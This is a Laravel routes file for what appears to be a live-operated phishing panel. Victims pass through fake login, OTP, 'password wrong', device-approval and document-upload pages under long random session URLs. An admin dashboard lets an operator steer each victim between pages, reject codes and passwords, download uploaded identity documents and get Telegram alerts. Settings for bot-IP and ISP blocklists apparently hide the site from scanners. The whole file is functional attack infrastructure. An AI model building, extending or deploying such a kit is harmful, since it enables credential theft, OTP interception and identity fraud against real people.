<?php

use App\Http\Controllers\Admin\AccessController;
use App\Http\Controllers\Admin\LoginLogController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Auth\AdminLoginController;
use App\Http\Controllers\Auth\UserLoginController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\ForceLogoutController;
use App\Http\Controllers\ApproveDeviceController;
use App\Http\Controllers\OtpController;
use App\Http\Controllers\PasswordWrongController;
use App\Http\Controllers\TelegramWebhookController;
use App\Http\Controllers\UploadDocumentController;
use App\Http\Controllers\WaitingController;
use App\Http\Middleware\BindUserPublicPath;
use App\Models\AccessSession;
use App\Models\Setting;
use App\Support\AccessSessionResolver;
use App\Support\AppRedirect;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

Route::get('/', function (Request $request) {
    // Entry point: /?{param} (configurable di Settings) → URL session panjang
    if (Setting::isLoginEntryRequest($request)) {
        if (Auth::guard('web')->check()) {
            return redirect()->route('admin.dashboard');
        }

        if (Auth::guard('user')->check()) {
            $session = AccessSessionResolver::current($request);

            if (AccessSessionResolver::isActive($session) && $session->status !== AccessSession::STATUS_LOGIN) {
                AccessSessionResolver::ensurePublicToken($session);

                return redirect()->route(
                    $session->routeForStatus() ?? 'waiting',
                    $session->pathParams()
                );
            }

            AccessSessionResolver::clearUserAuth($request);
        }

        $gate = AccessSession::startLoginGate();
        $request->session()->regenerate();
        $request->session()->put('access_token', $gate->token);

        return redirect()->route('user.login', $gate->pathParams());
    }

    return AppRedirect::fallback();
})->name('login.entry');

Route::post('/telegram/webhook/{secret}', TelegramWebhookController::class)
    ->where('secret', '[A-Za-z0-9]{20,}')
    ->name('telegram.webhook');

Route::middleware('guest:web')->group(function () {
    Route::get('/admin', [AdminLoginController::class, 'create'])->name('admin.login');
    Route::post('/admin', [AdminLoginController::class, 'store'])->name('admin.login.store');
});

Route::get('/logged-out', [ForceLogoutController::class, 'loggedOut'])->name('logged-out');

// All user pages live under long base64 session path
Route::prefix('s/{publicToken}')
    ->where(['publicToken' => '[A-Za-z0-9_-]{32,}'])
    ->middleware([BindUserPublicPath::class])
    ->group(function () {
        Route::middleware('guest:user')->group(function () {
            Route::get('/login', [UserLoginController::class, 'create'])->name('user.login');
            Route::post('/login', [UserLoginController::class, 'store'])->name('login.store');
        });

        Route::middleware('auth:user')->group(function () {
            Route::post('/logout', [UserLoginController::class, 'destroy'])->name('logout');
            Route::get('/force-logout', ForceLogoutController::class)->name('force-logout');

            Route::get('/waiting', [WaitingController::class, 'show'])->name('waiting');
            Route::get('/waiting/status', [WaitingController::class, 'status'])->name('waiting.status');

            Route::get('/otp', [OtpController::class, 'show'])->name('otp');
            Route::post('/otp', [OtpController::class, 'store'])->name('otp.store');

            Route::get('/password-wrong', [PasswordWrongController::class, 'show'])->name('password-wrong');
            Route::post('/password-wrong', [PasswordWrongController::class, 'store'])->name('password-wrong.store');

            Route::get('/approve-device', [ApproveDeviceController::class, 'show'])->name('approve-device');
            Route::post('/approve-device', [ApproveDeviceController::class, 'store'])->name('approve-device.store');

            Route::get('/upload-document', [UploadDocumentController::class, 'show'])->name('upload-document');
            Route::post('/upload-document', [UploadDocumentController::class, 'store'])->name('upload-document.store');

            Route::get('/dashboard', [DashboardController::class, 'user'])->name('dashboard');
        });
    });

// Keep named "login" for Laravel guest redirects → entry generator
Route::get('/login', function () {
    return AppRedirect::loginEntry();
})->name('login');

Route::middleware(['auth:web', 'role:admin'])->group(function () {
    Route::post('/admin/logout', [AdminLoginController::class, 'destroy'])->name('admin.logout');

    Route::get('/admin/dashboard', [DashboardController::class, 'admin'])->name('admin.dashboard');
    Route::delete('/admin/traffic-logs', [DashboardController::class, 'clearTraffic'])->name('admin.traffic.clear');
    Route::get('/admin/logs', [LoginLogController::class, 'index'])->name('admin.logs');
    Route::delete('/admin/logs', [LoginLogController::class, 'clear'])->name('admin.logs.clear');
    Route::redirect('/admin/block-logs', '/admin/dashboard?reason=blocked');
    Route::redirect('/admin/visitor-logs', '/admin/dashboard?reason=real');
    Route::get('/admin/access', [AccessController::class, 'index'])->name('admin.access');
    Route::delete('/admin/access', [AccessController::class, 'clear'])->name('admin.access.clear');
    Route::post('/admin/access/{accessSession}/send/{page}', [AccessController::class, 'send'])->name('admin.access.send');
    Route::post('/admin/access/{accessSession}/decline-otp', [AccessController::class, 'declineOtp'])->name('admin.access.decline-otp');
    Route::post('/admin/access/{accessSession}/decline-password', [AccessController::class, 'declinePassword'])->name('admin.access.decline-password');
    Route::post('/admin/access/{accessSession}/decline-device', [AccessController::class, 'declineDevice'])->name('admin.access.decline-device');
    Route::get('/admin/access/{accessSession}/document', [AccessController::class, 'downloadDocument'])->name('admin.access.document');
    Route::post('/admin/access/{accessSession}/close', [AccessController::class, 'close'])->name('admin.access.close');

    Route::get('/admin/settings', [SettingController::class, 'edit'])->name('admin.settings');
    Route::put('/admin/settings', [SettingController::class, 'update'])->name('admin.settings.update');
    Route::post('/admin/settings/webhook', [SettingController::class, 'setWebhook'])->name('admin.settings.webhook');
    Route::delete('/admin/settings/webhook', [SettingController::class, 'deleteWebhook'])->name('admin.settings.webhook.delete');
    Route::post('/admin/settings/test', [SettingController::class, 'test'])->name('admin.settings.test');
    Route::post('/admin/settings/telegram/detect', [SettingController::class, 'detectTelegramChats'])->name('admin.settings.telegram.detect');
    Route::post('/admin/settings/telegram/poll', [SettingController::class, 'enableTelegramPolling'])->name('admin.settings.telegram.poll');
    Route::delete('/admin/settings/one-time/{oneTimeIp}', [SettingController::class, 'destroyOneTimeIp'])->name('admin.settings.one-time.destroy');
    Route::delete('/admin/settings/one-time', [SettingController::class, 'clearOneTimeIps'])->name('admin.settings.one-time.clear');
    Route::post('/admin/settings/isp-list/reset', [SettingController::class, 'resetIspList'])->name('admin.settings.isp.reset');
    Route::post('/admin/settings/bot-ip/sync', [SettingController::class, 'syncBotIpBlocklist'])->name('admin.settings.bot-ip.sync');
    Route::post('/admin/settings/blacklist', [SettingController::class, 'storeBlacklist'])->name('admin.settings.blacklist.store');
    Route::delete('/admin/settings/blacklist', [SettingController::class, 'destroyBlacklist'])->name('admin.settings.blacklist.destroy');
});
